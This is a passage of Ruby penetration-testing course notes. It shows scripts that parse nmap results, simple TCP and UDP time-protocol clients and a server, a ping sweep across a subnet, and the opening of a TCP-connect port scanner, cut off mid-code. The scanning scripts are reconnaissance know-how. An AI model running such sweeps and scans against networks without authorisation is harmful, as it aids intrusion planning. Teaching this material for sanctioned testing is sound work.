<span class="n">stream</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span> <span class="c1"># Open the file stream</span>

<span class="n">stream</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span> <span class="c1"># For each line of the stream</span>
  <span class="n">line</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">ip_pattern</span><span class="p">)</span> <span class="k">do</span> <span class="c1"># If the IP is found and the IP host is up, extract each port</span>
    <span class="n">stream</span><span class="p">.</span><span class="nf">readline</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">up_host_pattern</span><span class="p">)</span> <span class="k">do</span>
      <span class="n">stream</span><span class="p">.</span><span class="nf">readline</span> <span class="c1"># Reads a line of type not shown *closed ports*</span>
      <span class="n">stream</span><span class="p">.</span><span class="nf">readline</span> <span class="c1"># Reads a line of type: "PORT STATE SERVICE"</span>

      <span class="n">stream</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span> <span class="c1"># From here, each line stores the port</span>
        <span class="n">line</span> <span class="o">=~</span> <span class="n">port_pattern</span> <span class="c1"># Line matches the port sub-pattern</span>
        <span class="nb">puts</span> <span class="vg">$1</span> <span class="k">if</span> <span class="vg">$1</span> <span class="c1"># Print the port</span>
        <span class="k">break</span> <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># If all the lines have been parsed, exit from the block</span>
      <span class="k">end</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<p>Example usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">pextr</span><span class="o">-</span><span class="n">n</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">filtered</span> <span class="o">&lt;</span><span class="n">nmap</span> <span class="n">file</span><span class="o">&gt;</span>
<span class="p">.</span><span class="nf">/</span><span class="n">pextr</span><span class="o">-</span><span class="n">n</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nmap</span> <span class="n">file</span><span class="o">&gt;</span> <span class="c1"># open ports only</span>
</code></pre></div></div>

<h3 id="grepable-format">Grepable format</h3>
<ul>
  <li>the recurring pattern is:</li>
  <li>port/status/protocol//service</li>
  <li>we can do it with String <strong>scan</strong> method</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">up_host</span> <span class="o">=</span> <span class="sr">/^Host:\s</span><span class="si">#{</span><span class="n">ip</span><span class="si">}</span><span class="sr">\s\(\)\s+Status: Up/</span>
<span class="n">port_pattern</span> <span class="o">=</span> <span class="sr">/(?:\s(\d+)\/</span><span class="si">#{</span><span class="n">port_state</span><span class="si">}</span><span class="sr">\/[^\/]+\/\/[^\/]+\/\/\/)/</span>
<span class="c1">#for each line of the stream</span>
<span class="n">stream</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
  <span class="c1">#if the ip is found</span>
  <span class="n">line</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">up_host</span><span class="p">)</span> <span class="k">do</span>
	<span class="c1">#reads the next line and extracts each port with scan method</span>
	<span class="n">stream</span><span class="p">.</span><span class="nf">readline</span><span class="p">.</span><span class="nf">scan</span><span class="p">(</span><span class="n">port_pattern</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">port</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">port</span><span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<p>The usage is the same as the last one:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">pextr</span><span class="o">-</span><span class="n">g</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">filtered</span> <span class="o">&lt;</span><span class="n">nmap</span> <span class="n">file</span><span class="o">&gt;</span>
<span class="p">.</span><span class="nf">/</span><span class="n">pextr</span><span class="o">-</span><span class="n">g</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nmap</span> <span class="n">file</span><span class="o">&gt;</span> <span class="c1"># open ports only</span>

</code></pre></div></div>

<h3 id="xml-format">XML format</h3>
<ul>
  <li>we are interested into the following path type:</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">host</span> <span class="o">&gt;</span> <span class="n">ports</span> <span class="o">&gt;</span> <span class="n">port</span> <span class="o">&gt;</span> <span class="n">portid</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- the following syntax allows us to go only into ports nodes that are opened and are related to the ip &lt;ip&gt;
- //host[address/@add='10.50.97.5']//port/state/@state='open']
- Remember that [] are For conditional statement and @ is used to indicate an attribute of a node
- the above string means that if we find an **host** node that has the address child node with the attribute **addr** equals to 10.50.97.5, then it should go into the **port** node that has a state node with the attribute **states** equals to open
</code></pre></div></div>

<h4 id="parses-the-xml-file-to-create-a-tree">parses the xml file to create a tree</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">doc</span> <span class="o">=</span> <span class="no">REXML</span><span class="o">::</span><span class="no">Document</span><span class="p">.</span><span class="nf">new</span> <span class="no">File</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="xpath-syntax-to-extract-only-the-desired-ports">XPath syntax to extract only the desired ports</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pattern</span> <span class="o">=</span> <span class="s2">"//host[address/@addr='</span><span class="si">#{</span><span class="n">ip</span><span class="si">}</span><span class="s2">']//port[state/@state='</span><span class="si">#{</span><span class="n">port_state</span><span class="si">}</span><span class="s2">']"</span>
</code></pre></div></div>

<blockquote>
  <p>For each address node child of host node
puts to stdout the addr attribute</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">doc</span><span class="p">.</span><span class="nf">elements</span><span class="p">.</span><span class="nf">each</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">port</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="n">port</span><span class="p">.</span><span class="nf">attributes</span><span class="p">[</span><span class="s2">"portid"</span><span class="p">]</span>
<span class="k">end</span>
</code></pre></div></div>

<p>The usage is the same:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">pextr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">filtered</span> <span class="o">&lt;</span><span class="n">nmap</span> <span class="n">file</span><span class="o">&gt;</span>
<span class="p">.</span><span class="nf">/</span><span class="n">pextr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nmap</span> <span class="n">file</span><span class="o">&gt;</span> <span class="c1"># open ports only</span>
</code></pre></div></div>

<h3 id="all-together-1">All together</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/ruby</span>
<span class="c1"># this method contains the main script logic</span>
<span class="nb">require</span> <span class="s2">"rexml/document"</span>

<span class="k">begin</span>
  
  <span class="p">(</span><span class="n">usage</span><span class="p">;</span><span class="nb">exit</span><span class="p">)</span> <span class="k">if</span> <span class="o">!</span><span class="n">match_ip</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">ip</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

  <span class="n">state</span><span class="p">,</span><span class="n">default</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
  <span class="n">type</span> <span class="o">=</span> <span class="n">default</span> <span class="p">?</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">:</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">file</span> <span class="o">=</span> <span class="n">default</span> <span class="p">?</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">:</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">f_type</span><span class="p">,</span><span class="n">file</span> <span class="o">=</span> <span class="n">match_file</span><span class="p">(</span><span class="n">type</span><span class="p">,</span><span class="n">file</span><span class="p">)</span>

<span class="n">main</span><span class="p">(</span><span class="n">f_type</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">state</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>

<span class="k">rescue</span> <span class="no">SystemExit</span>
<span class="k">rescue</span> <span class="no">Exception</span> <span class="o">=&gt;</span> <span class="n">e</span>
  <span class="nb">puts</span> <span class="n">e</span>

<span class="k">end</span>

</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">def</span> <span class="nf">usage</span>
<span class="n">st</span> <span class="o">=</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh">
pextr eLearnSecurity </span><span class="se">\u</span><span class="sh">00A9 2014
It extracts (open|filtered|closed) ports
of a specified ip address from nmap results.
Usage: pextr ip [Port State] [File Type] file|stream

PORT STATE
 -open      opened ports (default)
 -filtered  filtered ports
 -closed    closed ports
        
FILE TYPE
 -oX when file is an xml nmap output
 -oN when file is a normal nmap output
 -oG when file is a grepable nmap output
        
 [File Type] is not required when file has 
 .nmap | .xml | .gnmap extension

EXAMPLES
 pextr 10.50.97.5 nmap.xml
 pextr 10.50.97.5 -filtered -oX nmap.xmlout
 pextr 10.50.97.5 -closed file.nmap
 nmap -sS -n 192.168.1.15 | pextr 192.168.1.15 -oN

</span><span class="no">END</span>
  <span class="nb">puts</span> <span class="n">st</span>
<span class="k">end</span>

</code></pre></div></div>

<h1 id="network">Network</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The Network
	
  Socket Basics
		
  Penetration Testing Activities
		
  Raw Socket
	
  OS Interactions
</code></pre></div></div>

<h2 id="the-network">The Network</h2>

<p>We will see how to connect to a time server:</p>

<p>→ TCPSocket - http://ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/TCPSocket.html</p>

<p>→ UDPSocket - http://ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/UDPSocket.html</p>

<p>→ high level protocols = http://ruby-doc.org/stdlib-1.9.3/libdoc/net/</p>

<h2 id="sockets-basics">Sockets Basics</h2>

<h3 id="tcp-client">TCP Client</h3>

<h4 id="rfc868">RFC868</h4>
<p>→ http://tools.ietf.org/html/rfc868</p>

<ul>
  <li>TCPSocket is very simple, it requires a socket library.</li>
  <li>Lets us connect to the TIME server ip:64.113.32.5 port:37</li>
</ul>

<p>example 1:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'socket'</span>
  <span class="kp">true</span>
<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"165.193.126.229"</span><span class="p">,</span><span class="mi">37</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
  <span class="s2">"</span><span class="se">\xD6\x94\xA2\xC2</span><span class="s2">"</span>
<span class="n">int</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'N'</span><span class="p">)</span>
  <span class="p">[</span><span class="mi">3600065218</span><span class="p">]</span>
  <span class="c1"># since the Unix timestamp starts from 1 jan 1970 GMT, we must subtract 2208988800</span>
<span class="n">time</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="n">int</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="mi">2208988800</span><span class="p">)</span>
<span class="c1"># Output: 2014-01-30 11:31:20 +0100</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span>
</code></pre></div></div>

<p>example 2:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">time</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"165.193.126.229"</span><span class="p">,</span><span class="mi">37</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span>
  <span class="no">Time</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">gets</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'N'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">2208988800</span><span class="p">)</span>
<span class="k">end</span>
<span class="c1"># Output: 2014-01-30 11:31:20 +0100</span>

<span class="c1"># we can also do it in one line, just replace the do .. end with { }</span>
</code></pre></div></div>

<p>example 3:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">time</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"165.193.126.229"</span><span class="p">,</span><span class="mi">37</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="no">Time</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">gets</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'N'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">2208988800</span><span class="p">)}</span>
</code></pre></div></div>

<ul>
  <li>The <strong>addr</strong> method can be used to obtain information about local part of the stream. It returns the local address as an array which contains address_family, port, hostname and numeric_address</li>
</ul>

<p>s.addr in this case will return these informations</p>

<p>s.peeraddr - to obtain the same information about the remote part of the stream</p>

<p>s.peeraddr true = to specify that we want a reverse DNS lookup and find the hostname</p>

<ul>
  <li>to specify the port we need to use <strong>open</strong> with two parameters: source ip, port ip</li>
</ul>

<p>For example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"165.193.126.229"</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="s2">"10.0.2.15"</span><span class="p">,</span><span class="mi">6000</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">addr</span>
<span class="p">[</span><span class="s2">"AF_INET"</span><span class="p">,</span><span class="mi">6000</span><span class="p">,</span><span class="s2">"10.0.2.15"</span><span class="p">,</span><span class="s2">"10.0.2.15"</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="udp-client">UDP Client</h3>
<p>Udp is stateless and connectionless protocol:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'socket'</span>
<span class="n">s</span> <span class="o">=</span> <span class="no">UDPSocket</span><span class="p">.</span><span class="nf">new</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">"165.193.126.229"</span><span class="p">,</span><span class="mi">37</span><span class="p">)</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># Output: "binary data"</span>
<span class="n">time</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'N'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">2208988800</span><span class="p">)</span>
<span class="c1"># Output: "time "</span>

</code></pre></div></div>

<ul>
  <li>udp can lose packets because it doest not have an ack. So our <strong>recv</strong> can wait the packets in freeze our application.</li>
  <li>To avoit this situation we can use <strong>recv_nonblock</strong> that does not wait For the response.</li>
  <li>if no response is received, it raises an exception; therefore u can rescue it and continue with the script execution.</li>
</ul>

<h3 id="the-server">The server</h3>
<p>Create a TCPServer instance with <strong>new</strong> and provide the IP and port as arguments:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">server</span> <span class="o">=</span> <span class="no">TCPServer</span><span class="p">.</span><span class="nf">new</span> <span class="n">ip</span><span class="p">,</span><span class="n">port</span>
</code></pre></div></div>

<p>Cccept client requets:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kp">loop</span> <span class="k">do</span>
  <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="nf">accept</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Server logic code:</p>

<ul>
  <li>first, the server prints the information about the connected client; Then it sends the correct Time information according to the received type string</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print</span> <span class="no">Time</span><span class="p">.</span><span class="nf">new</span><span class="p">.</span><span class="nf">to_s</span> <span class="o">+</span> <span class="s2">" - IP: "</span><span class="o">+</span><span class="n">client</span><span class="p">.</span><span class="nf">peeraddr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="nb">print</span> <span class="s2">" Port: "</span><span class="o">+</span><span class="n">client</span><span class="p">.</span><span class="nf">peeraddr</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">tp_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
<span class="k">case</span> <span class="n">client</span><span class="p">.</span><span class="nf">gets</span><span class="p">.</span><span class="nf">chop</span>
  <span class="k">when</span> <span class="s2">"timestamp"</span> <span class="k">then</span> <span class="n">client</span><span class="p">.</span><span class="nf">puts</span><span class="p">(</span><span class="no">Time</span><span class="p">.</span><span class="nf">now</span><span class="p">.</span><span class="nf">to_i</span><span class="p">)</span>
  <span class="k">when</span> <span class="s2">"utc"</span> <span class="k">then</span> <span class="n">client</span><span class="p">.</span><span class="nf">puts</span><span class="p">(</span><span class="no">Time</span><span class="p">.</span><span class="nf">now</span><span class="p">.</span><span class="nf">utc</span><span class="p">)</span>
  <span class="k">when</span> <span class="s2">"local"</span> <span class="k">then</span> <span class="n">client</span><span class="p">.</span><span class="nf">puts</span><span class="p">(</span><span class="no">Time</span><span class="p">.</span><span class="nf">now</span><span class="p">)</span>
  <span class="k">else</span> <span class="n">client</span><span class="p">.</span><span class="nf">puts</span><span class="p">(</span><span class="s2">"Invalid operation"</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div>

<ul>
  <li>to finish the code we add the def main(ip,port) at the beginning</li>
  <li>and client.close at the end</li>
</ul>

<p>This is not suitable to handle a large number of client connections at the same time. In this situation, usually a multi-thread server is used; one thread is given at each client connection and the server can handle multiple connections at the same time (this avoids long queues)</p>

<p>Multi-threading tcp server (skeleton) example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1"># new TCP server bound to ip and port arguments</span>
<span class="n">server</span> <span class="o">=</span> <span class="no">TCPServer</span><span class="p">.</span><span class="nf">new</span> <span class="n">ip</span><span class="p">,</span><span class="n">port</span>
<span class="c1"># loop indefinitely to accept clients requests</span>
<span class="kp">loop</span> <span class="k">do</span>
  <span class="c1"># new request accepted - client is a socket</span>
  <span class="c1"># logic block is executed in a new thread</span>
  <span class="no">Thread</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">server</span><span class="p">.</span><span class="nf">accept</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">client</span><span class="o">|</span>
	<span class="c1">#.. server logic..</span>
	<span class="c1"># client variable is used to interact </span>
	<span class="c1"># with the connected client</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<h3 id="the-client">The Client</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">type</span><span class="p">)</span>
  <span class="c1"># open the connection with the time server</span>
  <span class="c1"># available on host and port arguments</span>
  <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span>
	<span class="c1">#send to the server the type of time we want</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">puts</span><span class="p">(</span><span class="n">type</span><span class="p">)</span>
	<span class="c1"># (timestamp|utc|local)</span>
	<span class="c1"># receives and puts to stdout the formatted time</span>
	<span class="nb">puts</span> <span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Run the server:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">time_Server</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Run the client:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">time_client</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span> <span class="n">timestamp</span>
<span class="c1"># Output: 1391425207</span>
</code></pre></div></div>

<blockquote>
  <p>The server will get information of the client request</p>
</blockquote>

<h2 id="ping-sweep">Ping Sweep</h2>
<ul>
  <li>using ICMP echo requests</li>
  <li>if the destination host is alive (and the ping is not filtered by a firewall), it will respond with a ICMP echo reply</li>
  <li>there are a lot of <strong>gems</strong> that w can use</li>
  <li><strong>net-ping</strong>: a collection of classes that provide different ways to ping computers</li>
</ul>

<blockquote>
  <p>To install a gem: gem install net-ping -r</p>
</blockquote>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'net/ping'</span>
<span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">Ping</span><span class="o">::</span><span class="no">ICMP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>

<span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="nf">ping</span> <span class="k">then</span> <span class="nb">puts</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">" UP"</span>
<span class="k">else</span> <span class="nb">puts</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">" DOWN"</span> <span class="k">end</span>

</code></pre></div></div>
<blockquote>
  <p>if the timeout is not provided we use 1 second by default. Then we scan each host of the network, sending an ICMP request andprint the current IP</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'net/ping'</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">network</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
  <span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span> <span class="p">?</span> <span class="n">timeout</span><span class="p">.</span><span class="nf">to_f</span> <span class="p">:</span> <span class="mi">1</span>

  <span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">254</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">network</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="nf">to_s</span>
    <span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">Ping</span><span class="o">::</span><span class="no">ICMP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>

    <span class="nb">puts</span> <span class="n">ip_address</span> <span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="nf">ping</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="k">begin</span>
  <span class="k">unless</span> <span class="no">ARGV</span><span class="p">.</span><span class="nf">length</span> <span class="o">==</span> <span class="mi">2</span>
    <span class="nb">puts</span> <span class="s2">"Usage: ruby script_name.rb network timeout"</span>
  <span class="k">else</span>
    <span class="n">main</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
  <span class="k">end</span>
<span class="k">end</span>


</code></pre></div></div>

<ul>
  <li>the network must be “xxx.xxx.xxx.”</li>
  <li>eg: “192.168.1.”</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Time</span> <span class="n">ruby</span> <span class="n">ping_sweep</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="mf">0.15</span> <span class="o">/</span><span class="sr">/ 0.15 seconds For each IP
# 10.0.2.2
# 10.0.2.3
# 10.0.2.4
# etc
</span></code></pre></div></div>

<h3 id="tcp-connect---port-scanning">TCP Connect - Port Scanning</h3>
<ul>
  <li>a port scan can be performed after the identification of an alive host or it can be used to verify if an host is alive.</li>
</ul>

<p>There is different types of port scanning:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">TCP</span> <span class="n">full</span> <span class="n">connection</span>
<span class="no">TCP</span> <span class="no">SYN</span>
<span class="no">TCP</span> <span class="no">ACK</span>
<span class="no">UDP</span>
</code></pre></div></div>

<p>The strategy to perform the scan:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">with</span> <span class="no">TCPSocket</span><span class="p">,</span> <span class="n">we</span> <span class="n">try</span> <span class="n">to</span> <span class="n">connec</span> <span class="n">to</span> <span class="n">an</span> <span class="n">host</span> <span class="n">port</span>
<span class="k">if</span> <span class="n">the</span> <span class="n">connection</span> <span class="n">is</span> <span class="n">successful</span> <span class="p">(</span><span class="no">TCP</span> <span class="n">three</span> <span class="n">way</span> <span class="n">handshake</span><span class="p">),</span> <span class="k">then</span> <span class="n">the</span> <span class="n">port</span> <span class="n">is</span> <span class="n">clearly</span> <span class="nb">open</span>
<span class="k">if</span> <span class="n">the</span> <span class="n">connection</span> <span class="n">is</span> <span class="n">refused</span><span class="p">,</span> <span class="k">then</span> <span class="n">the</span> <span class="n">port</span> <span class="n">is</span> <span class="n">closed</span> <span class="ow">or</span> <span class="n">firewalled</span> <span class="p">(</span><span class="n">the</span> <span class="n">host</span> <span class="ow">or</span> <span class="n">the</span> <span class="n">firewall</span> <span class="n">respond</span> <span class="n">with</span> <span class="no">RST</span><span class="o">+</span><span class="no">ACK</span><span class="p">)</span>
<span class="n">otherwise</span><span class="p">,</span> <span class="k">if</span> <span class="n">we</span> <span class="k">do</span> <span class="ow">not</span> <span class="n">receive</span> <span class="n">a</span> <span class="n">response</span><span class="p">,</span> <span class="n">there</span> <span class="n">is</span> <span class="n">probably</span> <span class="n">a</span> <span class="n">firewall</span> <span class="n">that</span> <span class="n">filters</span> <span class="n">the</span> <span class="n">port</span> <span class="n">with</span> <span class="n">no</span> <span class="n">response</span> <span class="n">at</span> <span class="n">all</span><span class="o">.</span>
</code></pre></div></div>

<ul>
  <li>Imagine a service filtered based on source IP addresses. If u r not in the source IP whitelist, u will receive an RST+ACK but the port is actually open as well as the service.</li>
</ul>

<p>The skeleton of the script</p>

<p>For each port between <strong>start_port</strong> and <strong>end_port</strong>, we the connection and we identify if its filtered or open:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nb">require</span> <span class="s1">'socket'</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">start_port</span><span class="p">,</span> <span class="n">end_port</span><span class="p">)</span>
  <span class="nb">open</span> <span class="o">=</span> <span class="p">[]</span>
